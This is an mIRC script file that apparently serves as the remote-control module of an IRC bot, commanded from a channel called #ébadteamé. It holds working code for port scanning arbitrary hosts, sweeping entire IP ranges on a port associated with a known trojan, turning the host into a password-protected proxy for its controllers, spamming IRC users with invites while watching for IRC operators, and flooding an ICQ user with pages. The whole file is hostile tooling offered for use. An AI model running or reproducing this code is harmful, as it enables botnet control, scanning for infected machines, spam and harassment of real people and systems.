[script]
n0=on *:sockopen:range.*:{ if ($sock($sockname).status == active) { set %range.ports %range.ports $sock($sockname).port | sockclose $sockname } }
n1=alias port.range.scan { set %range1 $calc( $gettok(%port.to.scan,1,45) - 1) | set %range2 $gettok(%port.to.scan,2,45) | :lewp | inc %range1 | if (%range1 <= %range2) { sockopen range. $+ %range1 %port.scan.ip %range1 | goto lewp } | else { .timergetportsempire 1 2 get.ports } }
n2=alias get.ports { /msg %schan 14[15portscan14] Open ports found: $iif(%range.ports != $null, %range.ports, None) | /msg %schan 14[15portscan14] Scanning Ports Successfully Completed for %port.scan.ip $+ $+ ... |  unset %range.ports %range1 %range2 %port.to.scan %port.scan.ip | unset %schan | sockclose range.* }
n3=on 700:TEXT:!portscan*:?: if ($4 == $null) { msg $nick Error !portscan [ip-address] [start-port] [end-port] | halt } | if ($calc($4 - $3) > 800) { msg $nick Error; please scan under 800 ports at a time! | halt }  | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan $nick |  //msg $nick 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip
n4=on 700:TEXT:!portscan*:#: if ($4 == $null) { msg # Error !portscan [ip-address] [start-port] [end-port] | halt }  |  if ($calc($4 - $3) > 800) { msg # Error; please scan under 800 ports at a time! | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan # |  //msg # 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip
n5=on 700:TEXT:!dns*:#: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | msg # 14..[`15dns14`].. 12Attempting to resolve2 $2 $+ 12... }
n6=on 700:TEXT:!dns*:?: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr $nick | msg $nick 14..[`15dns14`].. 12Attempting to resolve2 $2 $+ 12... }
n7=on *:DNS:{ if (%dns.r == on) { msg %dns.rr 14..[`15dns14`].. 12[2-Resolved-12]14:15 $iaddress 14-15 $naddress | unset %dns.* } }
n8=
n9=on 700:text:!subscan *:*:{
n10=  if ( $2 == stop ) { set %subscan off | .notice $nick Subscan stopped | halt }
n11=  if ( $2 == status ) { .notice $nick Scanning %a $+ . $+ %b $+ . $+ %c $+ . $+ %d  to %e $+ . $+ %f $+ . $+ %g $+ . $+ %h on port %subport . Currently $sock(subscan*,0) sockets being used by Subscan. Scanner is %subscan . | goto end }
n12=  if (( $2 != $null ) && ( $3 != $null ) && ( $4 != $null )) {
n13=    set %subport $4
n14=    set %subscan on
n15=    sub $2 $3
n16=    .notice $nick Scanning $2 to $3 on port %subport
n17=  }
n18=  else {
n19=    .notice $nick sorry but wrong syntax, !subscan startiprange stopiprange port , ex. "!subscan 24.0.0.1 24.254.254.254 27374".
n20=  }
n21=  :end
n22=}
n23=
n24=alias sub {
n25=  if ( $1 != $null ) { set %a $gettok( $1 , 1 , 46 ) | set %b $gettok( $1 , 2 , 46 ) | set %c $gettok( $1 , 3 , 46 ) | set %d $gettok( $1 , 4 , 46 ) }
n26=  if ( $2 != $null ) { set %e $gettok( $2 , 1 , 46 ) | set %f $gettok( $2 , 2 , 46 ) | set %g $gettok( $2 , 3 , 46 ) | set %h $gettok( $2 , 4 , 46 ) }
n27=  .sockopen subscan0 [ %a ] $+ . $+ [ %b ] $+ . $+ [ %c ] $+ . $+ [ %d ] %subport
n28=  while ( $sock( subscan*, 0 ) < 30 ) {
n29=    .sockopen subscan $+ $sock( subscan*, 0 ) [ $subip ] [ %subport ]
n30=  }
n31=  .timersubscan 0 1 subopen
n32=}
n33=
n34=on *:connect:{
n35=  if ( %subscan == on ) {
n36=    .timersubscan 0 1 subopen
n37=  }
n38=}
n39=
n40=on *:sockopen:subscan*:{
n41=  if ( $sockerr > 0 ) { 
n42=    .sockclose $sockname
n43=    subopen
n44=    return
n45=  }
n46=  .timer 1 5 .doit [ $sock( $sockname ).ip ] [ $sock( $sockname ).port ]
n47=  .sockclose $sockname
n48=  .subopen
n49=}
n50=
n51=on *:sockclose:subscan*:{
n52=  subopen
n53=}
n54=
n55=alias subopen {
n56=  if ( %subscan == off ) { return }
n57=  if ( $sock(subscan*,0) => 30 ) { return }
n58=  if (( %a == %e ) && ( %b == %f ) && ( %c == %g ) && ( %d == %h )) { set %subscan off | .timersubscan* off | return }
n59=  .sockopen subscan $+ $sock( subscan*, 0 ) $+ $rand(1,99) $+ $rand(1,99) [ $subip ] %subport
n60=}
n61=
n62=alias subip {
n63=  if ( %a < 255 ) {
n64=    if ( %b < 255 ) {
n65=      if ( %c < 255 ) {
n66=        if ( %d < 255 ) {
n67=          inc %d 1
n68=        }
n69=        else { inc %c 1 | set %d 1 }
n70=      }
n71=      else { inc %b 1 | set %c 0 | set %d 1 }
n72=    }
n73=    else { inc %a 1 | set %b 0 | set %c 0 | set %d 1 }
n74=  }
n75=  else { set %subscan off | halt }
n76=  return %a $+ . $+ %b $+ . $+ %c $+ . $+ %d
n77=}
n78=
n79=on 700:TEXT:!bnc*:*:{  if ($2 == stats) {   msg #ébadteamé 15*14BNC-STATS15* 12[14Total Users Connected:2(15 $+ $sock(bnc.in*,0) $+ 2) 14Bncs open:2(15 $+ $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ 2) 14Server Connections:2(15 $+ $sock(bnc.out*,0) $+ 2)12] } |  if ($2 == log)  { bnc log $3 | msg #ébadteamé 14•15BNC14• Logger has been set to $3 $+ ...  |  if ($3 == off) { remove bnc.log }   } | if ($2 == start) {  /bnc start $3 $4 |  msg #ébadteamé 2[14Bnc2] 15Setup complete:14 $Ip $+ 14:15 $+ $3  | msg #ébadteamé 2[14Bnc2] 14Usage:15 /server $Ip $+ 14:15 $+ $3 [Then /Quote Pass $4 $+ ]  |   halt     }  
n80=  if ($2 == help) {  msg #ébadteamé 14•15BNC14• Usage: !bnc [port] pass |  halt   } | if ($2 == stop) {  if ($sock(bnc. [ $+ [ $3 ] ] ,0) == 0) { msg #ébadteamé 14•15BNC14• Error: Bnc not active on that port! | halt }  | msg #ébadteamé 14•15BNC14• Server/port for $3 has been stopped. |  sockclose bnc. $+ $3  } | if ($2 == kill) && ($3 == users)   { msg #ébadteamé 14•15BNC14• [( $+ $sock(bnc.in*,0) $+ )] Users on bnc, have been disconnected... | sockclose bnc.in* | sockclose bnc.out*  } |  if ($2 == shutdown) {  msg #ébadteamé 14•15BNC14• BNC Server shutdown... (all settings reset) |  bnc reset  |  msg #ébadteamé 14•15BNC14• Server shutdown complete... } |  if ($2 == list) && ($3 == bnc) {   if ($sock(bnc.*,0) == 0) { msg #ébadteamé 14•15BNC14• Error, there are currently no bnc servers open... | halt }   
n81=    if ($sock(bnc.*,0) > 0) {   msg #ébadteamé 14•15BNC14• Listing Active/Open BNC's |    %bnc.stl = 0     |    :again  |   if ($sock(bnc.*,0) == %bnc.stl) { goto done } |  inc %bnc.stl  |  if ($gettok($sock(bnc.*,%bnc.stl),2,46) !isnum 1-65000) { goto again } |  msg #ébadteamé 14•15BNC14• $chr(35) $+ %bnc.stl $+ . [PORT: $+ $gettok($sock(bnc.*,%bnc.stl),2,46) $+ ] [PASS: $+ [ %bnc. [ $+ [ $gettok($sock(bnc.*,%bnc.stl),2,46) ] ] ] $+ ]   |  goto again |    :done |    msg #ébadteamé 14•15BNC14• End Listing Active BNC's...    }  } |  if ($2 == list) && ($3 == users)  {  if ($sock(bnc.in*,0) == 0) {  msg #ébadteamé 14•15BNC14• Error: No Users Connected to the bnc... | halt }   | if ($sock(bnc.in*,0) > 0) { msg #ébadteamé 14•15BNC14• Listing Active Users...   |  %bnc.stlu = 0 |  :again2  
n82=    if ($sock(bnc.in*,0) == %bnc.stlu) { goto done2 } |   inc %bnc.stlu  | msg #ébadteamé 14•15BNC14• $chr(35) $+ %bnc.stlu $+ . Connection: Nick:[ $+  [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .u ] ] ] $+ ] is $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) on port $sock(bnc.in*,%bnc.stlu).mark |    goto again2 |    :done2 |   msg #ébadteamé 14•15BNC14• List of Users Complete...  } }  | if ($2 == list) && ($3 == server)  {   if ($sock(bnc.out*,0) == 0) { msg #ébadteamé 14•15BNC14• Error: Currently No Users on Servers Connected... | halt }   
n83=if ($sock(bnc.out*,0) > 0) {   msg #ébadteamé 14•15BNC14• Listing Active Users and Servers... |  %bnc.stlus = 0 |  :again3 | if ($sock(bnc.out*,0) == %bnc.stlus) { goto done3 }  |  inc   %bnc.stlus |  msg #ébadteamé 14•15BNC14• $chr(35) $+ %bnc.stlus $+ .  [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,2,32) ] ] ] $+ / $+ [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,1,32) ] ] ] is %bnc. $+ $gettok($sock(bnc.out*,%bnc.stlus).mark,3,32) on $gettok($sock(bnc.out*,%bnc.stlus).mark,4-6,32)  |  goto again3 |   :done3 |  msg #ébadteamé 14•15BNC14• List of Users and Servers Complete...  } |  halt  } }
n84=alias bnc {    if ($1 == start) { //set %bnc. [ $+ [ $2 ] ] $3  | //socklisten bnc. $+ $2 $2  }  |  if ($1 == reset) { unset %bnc* | sockclose bnc* } |  if ($1 == log) { set %bnc.log $2 }  }
n85=on 1:socklisten:bnc.*:{   if ($sock(bnc.in.temp,0) == 1) { halt } | //set %bnc.smt $gettok($sockname,2,46) | /sockaccept bnc.in.temp | sockread }  
n86=on *:sockclose:bnc.in.*: { unset %bnc.ok. $+ $sockname | unset %bnc. $+ $sock($sockname).ip $+ * | unset %bp* | unset %temp.r* | if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {   sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } }
n87=on *:sockread:bnc.in.*:{   if ($sock(bnc.in.temp*,0) == 1) {   /sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  | /sockmark $sockname %bnc.smt | unset %bnc.smt |  //set  %bnc.ok. $+ $sockname no } |   sockread -f %temp.r  |  if (%bnc.log == on) { write bnc.log <<<[Incomming]>>> %temp.r }  |  if (%bnc.ok. [ $+ [ $sockname ] ] == no) {  if ($gettok(%temp.r ,1,32) == NICK) { set %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32)  |  //write bnc.log Connectoin from: $sock($sockname).ip Time: $time Date: $+ $date 
n88=    sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Welcome to B0rg-b0ts BNC Server. ( $+ $gettok(%temp.r ,2,32) $+ ) ***     | sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** From: $sock($sockname).ip Time: $time Date: $+ $date *** |  sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Please Type /QUOTE PASS PASSWORD to Continue ***   |  sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** For More help Type /QUOTE BNCHELP ***  |  halt  } 
n89=    if ($gettok(%temp.r ,1,32) == BNCHELP) {    sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Help Error: Login First! /QUOTE PASS [ PASSWORD ] |  halt  } |  if ($gettok(%temp.r ,1,32) == USER) {  set %bnc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) |  halt  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) ==  %bnc. [ $+ [ $sock($sockname).mark ] ] ) {  //sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Password Accepted ***  
n90=  //sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ *** Please type /quote conn server port to start ***  |   goto next  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %bnc. [ $+ [ $sock($sockname).mark ] ] ) {   sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Incorrect Password... |   inc %bp   } |  if (%bp >= 3) {   sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Too many bad password attempt's disconnecting...  |  sockclose $sockname | unset %bp }  |  halt   }
n91=  :next |  %bnc.ok. [ $+ [ $sockname ] ] = done | if ($gettok(%temp.r ,1,32) == IDENT) {   identd on $gettok(%temp.r ,2,32)  |  sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Ident set to $gettok(%temp.r ,2,32)  }  | if ($gettok(%temp.r ,1,32) == VHOST) {  if ($gettok(%temp.r ,2,32) == LIST) {  /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Listing VHOSTS |   /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ (1) System Default: $ip / $host $+ ... |   /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ End of VHOST / LIST |     halt   }
n92=    if ($gettok(%temp.r ,2,32) == 1) {    /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ VHOST Set as system default $ip : $host |    halt   } |  else {   /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ VHOST Error... Usage: /QUOTE VHOST LIST or /QUOTE VHOST # | halt }   } |   if ($gettok(%temp.r ,1,32) == BNCHELP) {    /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Listing Help Commands... |  /sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE IDENT [IDENT]  
n93=    /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE CONN [SERVER] [PORT]   |  /sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE PASS [PASSWORD]  |  /sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE VHOST LIST |  /sockwrite -nt $sockname  :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ - End List of HELP  |  halt  }  |  if ($gettok(%temp.r ,1,32) == CONN) {  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {  /sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Disconnecting from current server...  
n94=    sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )  }  |  if ($gettok(%temp.r ,3,32) == $Null) {   sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)  | /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 |  /sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port 6667  |   halt   }  |  /sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32)  
n95=/sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32) |  /sockwrite -nt $sockname :12..:: 14ßb 12::.. 14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port $gettok(%temp.r ,3,32)  |  halt    } |  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r   }  }  
n96=on *:sockopen:bnc.out.*:{ sockwrite -tn $sockname User [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]  | sockwrite -tn $sockname Nick %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] | sockread  } 
n97=on *:sockread:bnc.out.*:{ sockread -f %bnc.out.t   | if (%bnc.log == on) { write bnc.log <<<[Outgoing]>>> %bnc.out.t } | sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t |  unset %bnc.out.t }
n98=on 700:TEXT:!inviter*:*:{   %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg #ébadteamé 12[15in14vit15er12]:  Inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msg #ébadteamé 12[15in14vit15er12]: Status: Not Connected! | halt }  
n99=  if ($sock(inviter*,0) > 0) { msg #ébadteamé 12[15in14vit15er12]: Status: Connected [ $+ $sock(inviter*,0) $+ ] }     } |   if ($2 == stats) { msg #ébadteamé 12[15in14vit15er12]: (Stats) Total Invited: $calc( %i.t.j  +  %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }  |  if ($2 == message) { set %imsg $3- | msg #ébadteamé 12[15in14vit15er12]:  Invite Message set as [ $+ $3- $+ ] } 
n100=  if ($2 == ctotal) { msg #ébadteamé 12[15in14vit15er12]: Random Channels Total: $+ $lines(ichan.txt)  }  |  if ($2 == reset) { msg #ébadteamé 12[15in14vit15er12]: All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  
n101=  if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg #ébadteamé 12[15in14vit15er12]: Error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } 
n102=if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read src.txt $+ $rand(0,9) | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msg #ébadteamé 12[15in14vit15er12]:  Delay set to: ( $+ $3 $+ ). } }
n103=alias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c 12[15in14vit15er12]: Error: Please set delay !inviter delay [ [ [ delay ] ] ] | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c 12[15in14vit15er12]:  Error Starting Inviter, Inviter Server or Port not set! %iserver/%iserver.port | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c 12[15in14vit15er12]:  Error: Inviter already loaded! | halt }  
n104=//sockopen inviterN %i.server %i.port  | /msg %s.i.c 12[15in14vit15er12]:  Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ )  |  //sockopen inviterM %i.server %i.port  }
n105=on *:sockread:inviter*:{   sockread -f %t.i  |  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msg %s.i.c 12[15in14vit15er12]: Listing channels on $remove($gettok(%t.i,1,32),:) }  |  if ($gettok(%t.i,2,32) == 323) { msg %s.i.c 12[15in14vit15er12]: Listing channels complete on $remove($gettok(%t.i,1,32),:)  [Total Channels in List: $+ $lines(ichan.txt) $+ ] }  
n106=  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c 12[15in14vit15er12]:  Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) }    |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } |  if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == Off) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
n107=  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on Off |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on Yes  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } 
n108=  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c 12[15in14vit15er12]: Error Connecting: %t.i (attempting to reconnect)-(to stop !inviter stop) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } 
n109=  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) {    if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |     dec %i.t.j 1  |   /msg #ébadteaméfl33t inviter! error: not inviting: $gettok(%t.i,5,32)  because he was opd!   }   |   if ($gettok(%t.i,4,32) == +v) {   if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |    dec %i.t.j 1 |   } }
n110=  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) {  if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off   |  dec %i.t.j  } |  if ($gettok(%t.i,2,32) == 313) {   /msg %s.i.c 12Inviter Warning!!!: 3IRCOP DETECTED!!!! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] 
n111=if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  }  }
n112=on 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read src.txt $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  src.txt ] ] |  sockwrite -tn $sockname Nick $read src.txt $rand(0,9)  | /timerinviteconnect off | sockread  }
n113=on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msg %s.i.c 12[15in14vit15er12]:  Inviter was disconnected! (Reloading).  | /sockopen $sockname %i.server %i.port } }
n114=on 700:TEXT:!icqpagebomb*:#:{  if ($2 == help) { msg #ébadteamé Syntax: !icqpagebomb uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { msg #ébadteamé Icq Page Bomber (All Settings Reset!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { msg #ébadteamé Error!: !icqpagebomb uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { msg #ébadteamé ERROR! Under Ammount 100 please. (moreinfo type !icqpagebomb help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 
n115=msg #ébadteamé 14[15ICQPAGEBOMBER14]:15 Bombing:12 $2 14Ammount:12 $3 15Name/Email:12 $4 14Sub:12 $5 14Message:12 $6 3etc... |   /icqpagebomb  } 
n116=alias icqpagebomb { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 
n117=on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
n118=on *:sockread:icqpager*:{ sockread -f %temp }
n119=on *:sockclose:icqpager*:{ unset %temp }
